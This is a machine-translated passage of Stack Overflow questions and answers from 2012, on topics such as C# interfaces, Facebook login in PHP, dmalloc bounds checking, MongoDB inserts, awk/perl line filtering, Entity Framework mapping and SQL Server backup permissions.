public interface IRoleRepository
{
HolderNames HolderNamesbyRoleID(int roleid);
}
} 
```

然后我有服务：

```
namespace gpc.Data.Service
{
public class roleService : gpc.Data.Interfaces.IRoleService
{
    private ModelStateDictionary _modelState;
    private gpc.Data.Interfaces.IRoleRepository _repository;

    public roleService(ModelStateDictionary modelState)
    {
        _modelState = modelState;
        _repository = new gpc.Data.Repositories.roleRepository();
    }
    public roleService(ModelStateDictionary modelState,                                    
    gpc.Data.Repositories.roleRepository repository)
    {
        _modelState = modelState;
        _repository = repository;
    }

    public HolderNames HolderNames(int roleid)
    {
        return _repository.HolderNamesbyRoleID(roleid);
    }
}
} 
```

然后我有另一个界面：

```
namespace gpc.Data.Interfaces
{
public interface IRoleService
{
    HolderNames HolderNamesbyRoleID(int roleid);
}
} 
```

我在这个结构中创建了一个非常简单的 ienumerable，并且我能够通过控制器将数据获取到视图中，正如我所期望的那样。我想因为这个比选择所有内容并把它扔到一个视图中要复杂一些，所以我一定错过了一些东西。我不知道这是否有所不同，但“holdernames”是一个 SQL 视图，而不是一个表。

非常感谢任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:43:09.847

接口只包含签名。您必须在实现接口的类中编写实际实现。在您的情况下，您已经在 IRoleRepository 中 **定义了****HolderNamesbyRoleID**方法，但您尚未在**roleService**类中实现此方法。您必须在**roleService**类中实现**HolderNamesbyRoleID 。**

 **您的**roleService**类代码如下所示。

```
namespace gpc.Data.Service
{
public class roleService : gpc.Data.Interfaces.IRoleService
{
    private ModelStateDictionary _modelState;
    private gpc.Data.Interfaces.IRoleRepository _repository;

    public roleService(ModelStateDictionary modelState)
    {
        _modelState = modelState;
        _repository = new gpc.Data.Repositories.roleRepository();
    }
    public roleService(ModelStateDictionary modelState,                                    
    gpc.Data.Repositories.roleRepository repository)
    {
        _modelState = modelState;
        _repository = repository;
    }

    public HolderNames HolderNamesbyRoleID(int roleid)
    {
        return _repository.HolderNamesbyRoleID(roleid);
    }
}
} 
```

有关更多信息，请参阅[界面](http://msdn.microsoft.com/en-us/library/87d83y5b%28v=vs.80%29.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:30:28.623

这基本上就是您的编译器错误显示的内容。您的`IRoleService`接口定义了一个名为 的方法`HolderNamesbyRoleID`，但在您的实现中您只有一个名为 的方法`HolderNames`。

我认为这只是您的错误输入。**

# php - 在现有的 php 数据库中使用 facebook 集成 (oauth) 登录。严重需要建议

> ID：12300052
> 
> 赞同：0
> 
> 时间：2012-09-06T12:23:01.703
> 
> 标签：php, facebook, facebook-graph-api, oauth-2.0

我不是要解决我的问题，而是要给我一些关于我应该寻找什么或应该关注哪里的提示，以便完成这项工作。

问题是我的网站有他自己的注册系统，我不知道如何将其加入 facebook。访问者应该能够以两种方式登录，但我不知道该怎么做。

我已遵循本指南：http: [//25labs.com/tutorial-integrate-facebook-connect-to-your-website-using-php-sdk-v-3-xx-which-uses-graph-api/](http://25labs.com/tutorial-integrate-facebook-connect-to-your-website-using-php-sdk-v-3-x-x-which-uses-graph-api/)

但它在我的网站上给了我错误，我无法使用 facebook 登录。对此有任何建议。我还不知道我应该做什么。我的网站是用 php 编写的。

这是我尝试过的页面：www.dtraffic.biz/demo/index.php

教程作者说我应该查看 error_log 以查看问题所在，但是当我通过我的 cpanel 帐户查看时，那里什么也没有出现。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:40:29.060

这里有一些提示。

您必须在用户列表数据库中添加一个新字段。例子：

```
Database userlist, we add facebook-id field, so:
id    |    nick    |    passw    |    facebook-id
-------------------------------------------------
1     |    Llorx   |    mypass   |
2     |   Llorx12  |    mypass   | 
```

然后实现 Facebook PHP SDK，你可以按照 Facebook 教程进行操作。

当用户使用 Facebook 登录时，您可以要求创建一个新帐户或将他的 Facebook 帐户链接到他在您的网络中的现有帐户，在这两种情况下，您都必须用他的 Facebook id 填充数据库 facebook-id（您可以获得身份验证后使用 Facebook 图形 API 获取该信息）

```
id    |    nick    |    passw    |    facebook-id
-------------------------------------------------
1     |    Llorx   |    mypass   |    19348317401
2     |   Llorx12  |    mypass   | 
```

现在，每次有人使用 Facebook 登录时，您都可以检查他的 Facebook id 是否链接到您数据库中的任何帐户。

对不起，我的英语不好 ：-/

如果你得到的错误是错误 500，你有一些代码写错了，或者 Facebook API 也可能抛出一个错误，`try catch`然后`print_f`你就知道发生了什么。

另一个提示：Facebook 异常被调用`FacebookApiException`而不是`Exception`

# c - dmalloc 库如何确定是否发生了越界访问？

> ID：12300056
> 
> 赞同：0
> 
> 时间：2012-09-06T12:23:11.120
> 
> 标签：c, dmalloc

执行此代码时，库 dmalloc 以某种方式确定存在越界内存访问。因为它分配了 1023 个元素并试图访问第 1024 个元素。（数组索引从 0 开始）。

```
#include "dmalloc.h"
int main(){

    char *ch = malloc(1023);
    ch[1023] = 0x00;
    return 0;
} 
```

它怎么会知道？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:29:53.387

使用 dmalloc 库时，它实际上分配*的比*您请求的要多。*它在返回给您的内存之前*保留一个区域，在返回给您的内存*之后*保留一个区域。这些区域填充有特殊值，然后在释放内存时检查这些值。如果这些值不正确，那么您显然已经修改了内存超出范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:30:08.670

最简单的方法是使用哨兵，它们只是由 dmalloc 用已知模式填充的内存块。然后它可以检查该模式是否已被破坏，并标记错误。

# opengl - FreeGLUT编译的dll + lib？

> ID：12300059
> 
> 赞同：5
> 
> 时间：2012-09-06T12:23:25.283
> 
> 标签：opengl, dll, freeglut

我正在尝试让 FreeGLUT 正常工作。由于我不明白的原因，没有分发二进制文件。我在哪里可以下载 .lib 和 .dll 文件？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-06T13:07:26.963

您可以在[FreeGLut 下载页面的 Prepackaged](http://freeglut.sourceforge.net/index.php#download) **Releases**部分下载它们

 **[直接链接](http://www.transmissionzero.co.uk/software/freeglut-devel/)

请注意，它是由社区维护的。图书馆作者只提供源代码。

**来自页面本身的引用：** *如果您对这些软件包有疑问，请联系他们的维护者 - 我们 freeglut 团队可能无法提供帮助。*

如果您通过源代码分发尝试提供编译/链接日志，我们可以找到它无法正常工作的原因。**

# sencha-touch - 如何在 Sencha 框架中编辑取消按钮的样式。

> ID：12300063
> 
> 赞同：0
> 
> 时间：2012-09-06T12:23:43.137
> 
> 标签：sencha-touch, extjs, sencha-touch-2

我有这个代码

我需要将主题应用于 DataPicker 中存在的 Cacel 按钮......知道如何制作吗？

{ xtype：'datepickerfield'，标签：'开始日期 XXX'，名称：'DateStart'，

```
 //labelWidth: labelWidth,
            value: new Date(),
            picker: {
                yearFrom: yearFrom,
                yearTo  : yearTo,
                hideOnMaskTap: true

            //                toolbar: {
            //                    xtype: 'toolbar',
            //                    items: [
            //                        {
            //                            /*xtype: 'button',
            //                            text: 'Left',*/
            //                            ui: 'custom-btn-confirm',
            //                            style: 'color: #ffffff'
            //                        },
            //                        {
            //                            /*xtype: 'button',
            //                            text: 'Left Two',*/
            //                            ui: 'custom-btn-confirm',
            //                            style: 'color: #ffffff'
            //                        }
            //                    ]
            //                }                

            }                          
        },                                   
        { 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T10:15:12.883

您可以使用以下方法为按钮编写自定义 CSS：`cls: 'myapp-cancelbutton'`也可以使用预定义的`ui: 'cancel'`

# javascript - 通过 mongos 和 javascript 插入数据

> ID：12300073
> 
> 赞同：1
> 
> 时间：2012-09-06T12:24:03.973
> 
> 标签：javascript, mongodb

我想通过 mongos 执行一个 java 脚本文件，以便将数据插入我的分片集。除此之外，我想添加一个动态变量和 NULL 值 -

我会（手动）登录到外壳

> mongo hostip:port/admin my_script.js

我的 js 看起来像：

变量数量 = 1000000; 变量 x=1; 变量文档=''；

```
for (i=0; i<amount; i++)
{

doc = { a: '1', b: '2', c: 'text' , d:  'x', e: 'NULL'}
db.mycol.insert(doc);
x=x + 1

} 
```

（而“x”我可以只使用“i”）“d”是写“x”的值还是只写字母“x”？“e”会写文本“Null”还是..让我们说“数据库NULL”是我正确执行该过程的方式吗？（关于我如何连接到 mongos / 分片集）

最好的祝福

编辑：非常重要 - 我如何计算时间，mongodb/sharding 集需要存储所有数据？并平衡它？

编辑二：

嗨罗斯，

我有一个由两个分片（两个副本集）组成的分片集。目前我正在测试，因此我使用循环计数器作为分片键。有没有办法检查javascript中的时间？

更新：

那么测量存储数据所需的时间相当于执行 javascript 的时间吗？（或者由于执行而无法访问 mongo shell 的时间）

对于测量查询响应时间，该假设是否可以接受？（我必须在哪里存储 java 脚本文件？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:08:41.847

您不需要保留多个计数器 - 因为您`i`在 for 循环的每次迭代中递增。当你想要值而不是字符串时，使用`i`值`d`而`null`不是字符串`"NULL"`- 这是清理后的循环：

```
var amount = 1000000;
for (i=1; i<amount+1; i++) {
  doc = { a: '1', b: '2', c: 'text' , d:  i, e: null }
  db.mycol.insert(doc);
} 
```

关于存储/平衡数据需要多长时间 - 这取决于几个因素。

首先，你的分片键是什么？它是一个随机值还是一个增加的值（如时间戳）。分片键的随机模式有助于确保写入的均匀分布，如果您知道分片键的范围，您可以[预先拆分分片](http://docs.mongodb.org/manual/administration/sharding/#create-chunks-pre-splitting)以尝试确保它在加载数据时保持平衡。如果分片键像时间戳一样增加，那么很可能一个分片会变*热*，并且它将始终处于范围的顶端，并且必须拆分块并将数据迁移到其他分片。

在 MongoDB UK 上有几个关于分片的很好的演讲：分片[概述和分片](http://www.10gen.com/presentations/Mongodb-uk-2012/Overview-of-sharding)最佳[实践](http://www.10gen.com/presentations/Mongodb-uk-2012/sharding-best-practices)。

**更新：**

关于分片平衡需要多长时间 - 这取决于您机器上的负载。平衡是一个轻量级的过程，所以应该被认为是一个后台操作。重要的是要注意，即使使用分片系统，只要将数据写入`mongos`其可访问的查询即可。因此，如果分片在数据加载期间变得不平衡，则数据仍然可以访问 - 重新平衡分片可能需要时间 - 取决于分片的负载和新数据的添加，这意味着在迁移之前需要拆分块。

**更新2**

插入`mongos`是同步的，因此运行脚本所花费的时间就是应用插入所花费的时间。[关于使用getLastError](http://www.mongodb.org/display/DOCS/getLastError+Command)的写入持久性还有其他选项，基本上是在写入写入时阻塞多长时间。shell 调用`getLastError()`是透明的，但您[选择的语言](http://www.mongodb.org/display/DOCS/Drivers)的默认设置是异步的，不等待服务器响应。

*javascript文件存储在哪里？*- 这取决于你 - 它是你的应用程序代码。大多数用户会用他们喜欢的语言编写应用程序并使用驱动程序调用 mongodb。

# c# - Gridview Column 向列添加工具提示

> ID：12300093
> 
> 赞同：0
> 
> 时间：2012-09-06T12:25:31.820
> 
> 标签：c#, asp.net, gridview

我正在处理一个 ASP.NET 项目，我正在尝试添加一个`ToolTip`从. 请问有什么帮助吗？这是我用来绑定列的代码。`GridView``DataSet`

```
for (int i = 0; i < answers; i++)
{
    ds.Tables[0].Columns.Add(dans.Tables[0].Rows[i]["level"].ToString(), Type.GetType("System.Boolean"));
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-03T09:50:48.270

您可以使用此代码为特定列提供工具提示

```
 protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.DataRow)
        {
            Utility.RowColorChange(e);
            for (int colIndex = 0; colIndex < e.Row.Cells.Count; colIndex++)
            {
                string ToolTipString = "Edit Records";
                e.Row.Cells[5].Attributes.Add("title", ToolTipString);
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:39:28.633

好的！，我为 2 选项修复修复了您的问题：

1）按设计->设置Gridview->添加列->编辑列属性-> ![在此处输入图像描述](../Images/c1b120e57d523577aba5b1e7adc93d56.png)

2）按来源[单击此处此链接](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridviewcolumn.tooltiptext.aspx)，来自 MSDN。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-14T05:21:07.980

这也可以使用 JavaScript 来完成，将**CSS 类**添加到要放置工具提示的列中。然后在 JavaScript 中添加**title**属性。
以下是示例：

```
<asp:GridView ID="GridView1" runat="server">
  <Columns>
    <asp:BoundField DataField="DIAGNOSIS_CODE" HeaderText="Diagnosis Code"/>
    <asp:ButtonField DataTextField="DIAGNOSIS_NAME" HeaderText="Diagnosis Name"
         ControlStyle-CssClass="DiagButton" />
    <asp:BoundField DataField="ICD_CODE" HeaderText="ICD Code"/>
    <asp:BoundField DataField="ICD_NAME" HeaderText="ICD Name" />
  </Columns>
</asp:GridView> 
```

**JavaScript**

```
$(document).ready(function () {
        $(".DiagButton").attr("title", "Click to Edit Diagnosis Name");
    }); 
```

这会将标题属性添加到具有类**.DiagButton的列**

# perl - 如何从重复超过六次的文件中打印行

> ID：12300096
> 
> 赞同：3
> 
> 时间：2012-09-06T12:25:41.953
> 
> 标签：perl, unix, awk, nawk

我有一个包含如下数据的文件。第一个逗号分隔的字段可以重复任意次数，我只想打印该字段的任何值的第六次重复之后的行

例如，有八个字段`1111111`作为第一个字段，我只想打印这些记录中的第七个和第八个

输入文件：

```
1111111,aaaaaaaa,14
1111111,bbbbbbbb,14
1111111,cccccccc,14
1111111,dddddddd,14
1111111,eeeeeeee,14
1111111,ffffffff,14
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,aaaaaaaa,14
2222222,bbbbbbbb,14
2222222,cccccccc,14
2222222,dddddddd,14
2222222,eeeeeeee,14
2222222,ffffffff,14
2222222,gggggggg,14
3333333,aaaaaaaa,14
3333333,bbbbbbbb,14
3333333,cccccccc,14
3333333,dddddddd,14
3333333,eeeeeeee,14
3333333,ffffffff,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

输出：

```
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,gggggggg,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

我尝试过的是相对于第一个转置第二个和第三个字段，以便我可以在or`nawk`的字段上使用`$7``$8`

```
#!/usr/bin/ksh awk -F"," '{ a[$1]; b[$1]=b[$1]","$2 c[$1]=c[$1]","$3} END{ for(i in a){ print i","b[i]","c[i]} } ' file > output.txt 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T13:24:32.563

# **如果您的记录是无序的**

即您可能在整个输入中随机分布“1111111”项：

```
$ awk -F, '++a[$1] > 6' input.txt
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,gggggggg,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

**这是如何运作的？**

如您所知，awk 的`-F`选项设置分隔符。如果它不是特殊字符，则没有迫切需要引用它。

awk 脚本由一系列`condition { action; }`. 如果条件缺失，则对每一行应用操作。如果缺少该动作，则暗示为`print;`。因此，仅包含一个条件的 awk 脚本将打印该条件评估为真的每个输入行。

在这种情况下，我们的条件也有一个动作的元素。它增加了关联数组的元素，其中键是您的第一个字段。无论条件评估是否为真，都会发生增量。此外，`++` *提前*而不是*跟随*变量会导致增量发生*在*评估之前而不是*之后*。（我说的是 和 之间的区别`++var`。`var++`）如果结果递增的数组元素大于 6，则条件评估为真，导致打印行。

这在功能上等同`perl`于其他答案中的解决方案，但由于 awk 脚本的性质，它甚至更严格并且（可以说）更简单。当然，它可能会更快。（在我刚才的非正式测试中，上面的 awk 脚本的执行速度是另一个答案的等效 perl 脚本的两倍多，在 0.23 秒的用户时间内处理 250000 行输入，而在 perl 中处理 0.61 秒。）

# **如果您的记录被订购**

即你所有的“1111111”行都在一起：

```
$ awk -F, '$1!=f{c=0;f=$1} ++c>6' input.txt
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,gggggggg,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

**这是如何运作的？**

*   如果我们使用的 $1 与上次不同（在第一行也是如此），我们将重置计数器并将 $1 保存到变量中以供将来比较。
*   然后我们增加计数器并在计数器高于 6 时打印该行（隐式）。

这具有不占用数组内存的优点，但仅适用于您的目标是匹配具有公共 $1 的连续行集，而不是处理可能在整个输入中随机分布的匹配行。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-06T13:20:00.970

```
$ perl -F',' -ane 'print unless $seen{ $F[0] }++ < 6' file.txt 
```

**解释**

*   `-a`启用自动拆分模式，`-F','`指定`','`为拆分标记，结果列表存储在`@F`结果中
*   `-n`启用隐式逐行循环
*   `-e`执行以下参数（`'...'`在这种情况下）作为 Perl 代码
*   `%seen`跟踪看到第一个字段的次数

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-06T13:13:01.413

假设你的数据中的点应该是逗号，这个 Perl 命令会按照你的要求做

```
perl -aF, -ne 'print if ++$n{$F[0]} > 6' myfile 
```

**输出**

```
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,gggggggg,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-06T12:45:15.980

使用 awk (filter.awk)：

```
BEGIN    { FS = "[,.]"          }   
o == $1  { cnt++                } 
o != $1  { o=$1; cnt = 0;       }
cnt >= 6 { print $0             } 
```

要使用：

```
awk -f filter.awk input_file 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:22:18.557

如果你想特别有 awk 解决方案，那么它就在下面：

```
awk -F, '{if(seen==$1){count++;}else{seen=$1;count=1}if(count>6)print }' file 
```

测试如下：

```
> awk -F, '{if(seen==$1){count++;}else{seen=$1;count=1}if(count>6)print }' temp
1111111,gggggggg,14
1111111,hhhhhhhh,14
2222222,gggggggg,14
3333333,gggggggg,14
3333333,hhhhhhhh,14 
```

如果你需要一个 perl 脚本，那么请看下面：

```
#!/usr/bin/perl

use strict;
use warnings;

my $count=0;
my $prev="";
open (MYFILE, 'temp');
while (<MYFILE>) {
       my @a=split(/,/);
       if($prev==$a[0])
       {
        $count++;
        if($count>6)
         {
           print "$_";       
          }
        }
        else
        {
        $prev=$a[0];
        $count=1; 
        }

 }
close (MYFILE); 
```

# entity-framework - 首先在实体框架代码中将 2 个不同表的主键相互映射

> ID：12300105
> 
> 赞同：0
> 
> 时间：2012-09-06T12:26:09.090
> 
> 标签：entity-framework, entity-framework-4, entity-framework-4.1, ef-code-first, code-first

我首先使用 Entity Framework 4.3.1 代码。我的数据库中有 2 个表，其中列出了它们的列名：

状态表：

```
StatusID int
Status varchar(50) 
```

请求状态表：

```
RequestStatusID int
RequestStatus varchar(50) 
```

我有 2 节课：

```
public class Status : IEntity
{
     public int Id { get; set; }
     public string Name { get; set; }

     public RequestStatus RequestStatus { get; set; }
}

public class RequestStatus : IEntity
{
     public int Id { get; set; }
     public string Name { get; set; }

     public Status Status { get; set; }
} 
```

我的数据库上下文类：

```
public class ICaseDbContext : DbContext
{
     public DbSet<Status> Statuses { get; set; }
     public DbSet<RequestStatus> RequestStatuses { get; set; }

     protected override void OnModelCreating(DbModelBuilder modelBuilder)
     {
          modelBuilder.Configurations.Add(new StatusConfiguration());
          modelBuilder.Configurations.Add(new RequestStatusConfiguration());
     }
} 
```

他们的配置：

```
class StatusConfiguration : EntityTypeConfiguration<Status>
{
     internal StatusConfiguration()
     {
          this.ToTable("Statuses");
          this.Property(x => x.Id).HasColumnName("StatusID");
          this.Property(x => x.Name).HasColumnName("Status");
     }
}

class RequestStatusConfiguration : EntityTypeConfiguration<RequestStatus>
{
     internal RequestStatusConfiguration()
     {
          this.ToTable("RequestStatuses");
          this.Property(x => x.Id).HasColumnName("RequestStatusID");
          this.Property(x => x.Name).HasColumnName("RequestStatus");
     }
 } 
```

每个表中的数据是这样的：

请求状态表：

```
RequestStatusID     RequestStatus
1                   RequestStatus1
2                   RequestStatus2
3                   RequestStatus3
4                   RequestStatus4 
```

状态表：

```
StatusID            Status
1                   Status1
2                   Status2
3                   Status3
4                   Status4 
```

每个表的主键与另一个表中的主键匹配。所以如果我有一个RequestStatus1的请求状态，那么对应的状态一定是Status1。如果我的状态为 Status3，则相应的请求状态必须为 RequestStatus3。

这可能吗？

如何在 EF 中进行设置

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:50:57.283

我认为你想要一个 1:1 的映射，所以两端都是必需的，使用 Id 作为键。

像这样更新您的配置将创建您想要的表：

```
class StatusConfiguration : EntityTypeConfiguration<Status>
{
    internal StatusConfiguration()
    {
        this.ToTable("Statuses");
        this.Property(x => x.Id).HasColumnName("StatusID");
        this.Property(x => x.Name).HasColumnName("Status");

        this.HasRequired(x => x.RequestStatus)
            .WithRequiredPrincipal();

    }
}

class RequestStatusConfiguration : EntityTypeConfiguration<RequestStatus>
{
    internal RequestStatusConfiguration()
    {
        this.ToTable("RequestStatuses");
        this.Property(x => x.Id).HasColumnName("RequestStatusID");
        this.Property(x => x.Name).HasColumnName("RequestStatus");

        this.HasRequired(x => x.Status)
           .WithRequiredDependent();
    }
} 
```

# objective-c - iOS 中的 Facebook 应用请求（不使用对话框）

> ID：12300109
> 
> 赞同：0
> 
> 时间：2012-09-06T12:26:14.613
> 
> 标签：objective-c, ios, facebook

我需要向 Facebook 中用户的朋友发送一个请求，将我的应用程序扔给用户（在 Facebook 上的应用程序被授权后）我知道有一种方法可以通过 SDK 做到这一点：

```
[self.facebook dialog:@"apprequests" andParams:params andDelegate:nil]; 
```

但是我不需要那种方式来显示对话框我只需要能够在用户从中选择朋友时在后台发送请求（例如表格视图）。

这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T14:09:22.833

Facebook Dialog API 尚未更新（希望如此）。您无法以您想要的方式绕过对话框。但是你可以 ：

1.  使用您自己的 GUI 预先选择朋友，并为 apprequest 提供所选的 facebook id。这样，对话只是为了确认请求。

2.  激活frictionless 参数，以避免下次您向相同选定的朋友发送请求时出现对话框（确认对话框似乎无论如何都会显示，然后立即消失，它在屏幕上给出了一个不太好的闪烁）。

这是相关文档，以备不时之需：[https ://developers.facebook.com/docs/howtos/send-requests-using-ios-sdk/](https://developers.facebook.com/docs/howtos/send-requests-using-ios-sdk/)

# certificate - lighttpd - 不要在无效的 ssl 密钥/证书上终止？

> ID：12300111
> 
> 赞同：0
> 
> 时间：2012-09-06T12:26:23.850
> 
> 标签：certificate, lighttpd, verify

我在嵌入式设备上使用 lighty，允许高级用户使用 Web 界面操作系统配置。用户可以上传包含有效私钥和证书信息的 PEM 文件。

现在我想知道如果文件损坏，如何避免lighty无法启动？一种想法是在安装之前检查文件，但似乎没有简单的解决方案。

我的另一个想法是配置 lighty，使其能够识别文件无效（实际上它确实如此）但它不应该终止。相反，它应该在没有 SSL 功能的情况下运行，因此只有 HTTP。

有没有办法为此配置轻量级？还是有更好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T22:05:01.563

这应该为您的需要提供足够的检查选项

```
openssl verify --help 
```

如果证书检查失败，您可以使用 perlscript 注释掉任何与 ssl 相关的配置块，但这超出了这个问题。

当然你需要编辑启动`lighttpd`/`lighttpd.service`

# java - 为什么jdk中没有ConcurrentLinkedHashMap类？

> ID：12300115
> 
> 赞同：10
> 
> 时间：2012-09-06T12:26:27.920
> 
> 标签：java, data-structures, java.util.concurrent

这个问题直接[来自我在 SO 中的上一个问题](https://stackoverflow.com/q/12299731/1527084)。我认为我的第二个问题的答案是否定的。所以我想了解为什么 java.util.concurrent 包中没有 ConcurrentLinkedHashMap ？我的意思是有一个 ConcurrentHashMap 但没有 ConcurrentLinkedHashMap 。在并发环境中拥有这样一个类根本没有任何意义吗？我的意思是它不可用的主要技术原因是什么？Guava/Apache Commons 中有类似的东西吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-06T12:42:54.857

> 为什么jdk中没有ConcurrentLinkedHashMap类？

您需要询问 Oracle Java 人员，但我认为它是以下各项的组合：

*   认为没有多少人需要它，并且
*   在高并发用例中实现具有良好性能属性的数据结构的固有困难。

在这种情况下，在我看来，实现集合类以便迭代键/值/条目集不是并发瓶颈......嗯......困难。（即使人们*已经找到*了一种方法来做到这一点，但事实仍然是设计、实现和证明通用高度并发数据结构和算法的正确性是很困难的。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-17T13:58:53.887

看起来有一个来自 Google [https://code.google.com/p/concurrentlinkedhashmap/](https://code.google.com/p/concurrentlinkedhashmap/)

另请查看这篇文章： [ConcurrentLinkedHashMap 已集成到 Guava 中意味着什么？](https://stackoverflow.com/questions/15299554/what-does-it-mean-that-concurrentlinkedhashmap-has-been-integrated-into-guava)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T12:43:54.413

```
#define PERSONAL_OPINION 
```

从设计的角度来看，总是必须使用更有意义

```
Map m = Collections.synchronizedMap(new HashMap());
  ...
Set s = m.keySet();  // Needn't be in synchronized block
  ...
synchronized(m) {  // Synchronizing on m, not s!
   Iterator i = s.iterator(); // Must be in synchronized block
   while (i.hasNext())
      foo(i.next());
} 
```

[synchronizedMap](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/Collections.html#synchronizedMap%28java.util.Map%29)中的示例

为什么？因为同步机制与高抽象（`Map`接口）相关联。但假设我是对的，仍然有两个理由`ConcurrentHashMap`：

*   `ConcurrentHashMap`在此同步机制之前存在
*   在创建特定的同步机制时会获得性能提升。

我的观点是，理想的设计世界甚至`ConcurrentHashMap`不应该存在。

```
#end //personal opinion 
```

# c# - XmlSerializer 反序列化在发布模式下失败

> ID：12300116
> 
> 赞同：0
> 
> 时间：2012-09-06T12:26:28.483
> 
> 标签：c#, xml, serialization

这很奇怪。我有一个格式良好的 XML 配置文件。我从文件中创建了一个流，并使用看似非常典型的代码对其进行序列化：

```
TextWriter tw = new StreamWriter(tempFile); 
```

我使用如下创建的序列化程序：

```
XmlSerializer ConfigSettingSerializer = new XmlSerializer(typeof(ConfigSettings)); 
```

其中 ConfigSettings 只是一个包含字符串变量和值的容器类。

然后，我使用 ConfigurationManager 类和 AppSettings 将序列化流作为配置存储起来。然后我从 appSettings 检索序列化数据并尝试将流转换回原始类：

```
string configXml = ConfigurationManager.AppSettings[Id];
using (StringReader reader = new StringReader(configXml))
        {                
            retVal = (ConfigSettings)MVHelper.ConfigSettingSerializer.Deserialize(reader);
        } 
```

这一切都运行良好，直到我从调试切换到发布，当我在反序列化调用中收到关于无效 XML 的错误时，抱怨文档中的最后一个字符：XML 文档中存在错误 (92, 18)。内部异常是：“根级别的数据无效。第 92 行，第 18 位”。该文档与在调试模式下生成的文档相同，并且可以在任何浏览器中正常呈现。我的猜测是，可能还有其他事情发生，真正的错误被某种方式掩盖了，但到目前为止我还没有看到。任何建议将不胜感激。

谢谢，

加里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T12:42:01.833

在十六进制编辑器或其他二进制编辑器中加载 XML 文件，并检查编码前导码等不可打印字符。

# asp.net - 无法在共享主机上运行 sql 备份脚本

> ID：12300118
> 
> 赞同：1
> 
> 时间：2012-09-06T12:26:33.163
> 
> 标签：asp.net, sql, backup, shared-hosting

我无法通过 asp.net 网站在共享主机上运行 SQL 备份脚本

这是错误消息：

> 数据库“TestDB”中的 BACKUP DATABASE 权限被拒绝。
> 
> BACKUP DATABASE 异常终止。

这是代码：

```
sqlcon.Open();
//query to take backup database
sqlcmd = new SqlCommand("backup database TestDB to disk='" + destdir + "\\" +  dbname + "_" + DateTime.Now.ToString("ddMMyyy") + ".Bak'", sqlcon);
sqlcmd.ExecuteNonQuery();
//Close connection
sqlcon.Close(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:27:46.010

您正在连接的用户帐户没有进行备份的权限。

（这就是错误所说的）

仅默认为成员`db_owner`或`db_backupoperator`拥有权限的用户。`backup database`

您的托管服务提供商可能会提供其他一些备份机制。

# c# - 使用实体框架更新复杂数据实体

> ID：12300124
> 
> 赞同：0
> 
> 时间：2012-09-06T12:26:50.433
> 
> 标签：c#, asp.net-mvc, entity-framework

我在 Visual Studio 2010 中使用 MVC3、C# 4.0 和实体框架。我有一个复杂的数据实体（一个包含两个子实体的基本类型；每个都包含更多实体）。

我可以看到如何对所有内容进行批量更新，但想知道当只有几个字段可能发生更改时，更新此内容的最佳做法是什么。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:33:00.193

通常，在这种情况下，我的好主意是定义一个视图模型，它代表您从用户界面获得的数据作为输入。这可能是您的复杂图形的平面表示。然后在您的存储库或更好的领域层中，可能有一个映射或一个处理方法/类来填充您的模型或进行批量/批量更新等......

所以通常在中间有某种类（或更多）通常会有所帮助......

在不了解您的应用程序架构的情况下，这是我的 2 美分...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:02:40.983

如果多个子实体的属性发生了变化，我会将其作为对复杂数据实体的更新来处理。如果只需要更新其中一个子实体，那么我会将其作为仅针对该特定实体的更新来处理。这确实是逐案基础类型的情况。

# objective-c - 活动监视器中的图标？

> ID：12300125
> 
> 赞同：4
> 
> 时间：2012-09-06T12:26:53.707
> 
> 标签：objective-c, macos, unix

![在此处输入图像描述](../Images/483364e525c302471531411a68c1e881.png)

在上图中，一些进程的名称旁边有“图标”。流程必须满足什么特征才能在其名称旁边有一个“图标”？请注意，定义特征**不仅仅是**位于 Applications 文件夹中，因为 Applications 文件夹中的多个进程位置没有图标。

此外，如何检查 PID 是否符合 Objective-C 中的定义标准？（在 OSX 上使用 Cocoa）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:52:36.793

我认为只有当您打开它们时在 Dock 中出现图标的应用程序才会在活动监视器中显示图标。

* * *

## 回答 #2

> 赞同：1
> 
